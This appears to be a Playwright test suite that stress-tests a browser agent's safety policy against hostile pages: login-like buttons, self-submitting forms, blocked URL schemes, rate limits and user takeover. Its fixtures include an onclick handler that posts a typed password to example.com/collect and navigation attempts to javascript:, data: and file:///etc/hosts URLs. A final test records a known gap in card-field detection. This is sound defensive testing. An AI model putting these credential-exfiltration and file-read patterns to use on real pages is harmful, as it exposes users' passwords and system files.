import { expect, test } from '@playwright/test';

// Adversarial pages against the agent: what an injected instruction or a
// hostile script can and cannot get out of it.
const PAGE = process.env.PAGE_PATH ?? '/';
const view = (page) => page.locator('inception-view');
const evaluate = (page, source) => view(page).evaluate((el, s) => el.debugEvaluate(s), source);
const agent = (page, method, ...args) => view(page).evaluate((el, [m, a]) => el.agent[m](...a), [method, args]);
const outcome = (page, method, ...args) =>
  view(page).evaluate(async (el, [m, a]) => {
    try {
      await el.agent[m](...a);
      return 'ok';
    } catch (error) {
      return { reason: error.data?.reason, message: error.message, data: error.data };
    }
  }, [method, args]);

async function open(page, html, title = 'Page') {
  await page.goto(`${PAGE}?url=about:blank&agent=1`);
  await view(page).evaluate((el) => el.ready);
  const doc = `<title>${title}</title>${html}`;
  await expect.poll(() => evaluate(page, `document.open(); document.write(${JSON.stringify(doc)}); document.close(); document.title`), { timeout: 60_000 }).toBe(title);
}

async function ref(page, role, name) {
  const { matches } = await agent(page, 'find', { role, name });
  expect(matches.length, `${role} "${name}"`).toBeGreaterThan(0);
  return matches[0].ref;
}

test('a harmless-looking button that posts a filled password from script is weighed as a login', async ({ page }) => {
  await open(page, `<input type="password" id="p" value="hunter2" aria-label="Password">
    <button id="next" onclick="window.sent = (window.sent || 0) + 1; fetch('https://example.com/collect', { method: 'POST', body: document.getElementById('p').value })">Next</button>`);
  const next = await ref(page, 'button', 'Next');
  await agent(page, 'requestControl');
  expect(await outcome(page, 'click', { ref: next })).toMatchObject({ reason: 'denied_by_policy', data: { risk: 'login' } });
  expect(await evaluate(page, 'String(window.sent || 0)')).toBe('0');
});

test('only http(s) addresses can be opened by the agent', async ({ page }) => {
  await open(page, '<p>hello</p>');
  await agent(page, 'requestControl');
  for (const url of ['javascript:alert(1)', 'data:text/html,<script>1</script>', 'file:///etc/hosts', 'blob:https://x/1', ' JAVASCRIPT:1', 'ftp://example.com/']) {
    expect(await outcome(page, 'navigate', { url }), url).toMatchObject({ reason: 'invalid_params' });
  }
});

test('the person taking control while the policy is still asking stops the action', async ({ page }) => {
  await open(page, '<button onclick="window.clicks = (window.clicks || 0) + 1">Go</button>');
  await page.evaluate(async () => {
    const { Inception } = await import('/host/inception-view.js');
    Inception.configure({ agent: { policy: (request) => (request.action === 'control' ? true : new Promise((resolve) => setTimeout(() => resolve(true), 1500))) } });
  });
  const go = await ref(page, 'button', 'Go');
  await agent(page, 'requestControl');
  const pending = outcome(page, 'click', { ref: go });
  await page.waitForTimeout(300);
  const box = await view(page).boundingBox();
  await page.mouse.click(box.x + box.width - 20, box.y + box.height - 20);
  expect(await pending).toMatchObject({ reason: 'control_held' });
  expect(await evaluate(page, 'String(window.clicks || 0)')).toBe('0');
});

test('a form the page submits by itself while the agent has control is blocked', async ({ page }) => {
  await open(page, '<form id="f" method="post" action="https://example.com/post"><input name="a" value="1"></form>');
  await view(page).evaluate((el) => {
    window.blocked = [];
    el.addEventListener('agentblocked', (e) => window.blocked.push(e.detail.risk));
  });
  await agent(page, 'requestControl');
  await evaluate(page, "setTimeout(() => document.getElementById('f').submit(), 0), 1");
  await expect.poll(() => page.evaluate(() => window.blocked)).toEqual(['submit']);
  expect(await view(page).evaluate((el) => el.url)).toBe('about:blank');
});

test('the rate limit refuses actions beyond it', async ({ page }) => {
  await open(page, '<button>Go</button>');
  await page.evaluate(async () => {
    const { Inception } = await import('/host/inception-view.js');
    Inception.configure({ agent: { maxActionsPerMinute: 3 } });
  });
  const go = await ref(page, 'button', 'Go');
  await agent(page, 'requestControl');
  const results = [];
  for (let i = 0; i < 5; i++) results.push(await outcome(page, 'click', { ref: go }));
  expect(results.filter((r) => r === 'ok').length).toBeLessThanOrEqual(3);
  expect(results.some((r) => r?.reason === 'rate_limited')).toBe(true);
});

test('a card field with no hints in its attributes is still typed into without approval (known gap)', async ({ page }) => {
  await open(page, '<form method="post" action="https://example.com/pay"><label>Number on the front <input id="n"></label><button>Pay</button></form>');
  const field = await ref(page, 'textbox', 'Number on the front');
  await agent(page, 'requestControl');
  // Nothing in the markup says "card": the engine's heuristics (autocomplete,
  // name, id, placeholder, aria-label) cannot know. The submit is still gated.
  expect(await outcome(page, 'type', field, '4111111111111111')).toBe('ok');
  const pay = await ref(page, 'button', 'Pay');
  expect(await outcome(page, 'click', { ref: pay })).toMatchObject({ reason: 'denied_by_policy' });
});
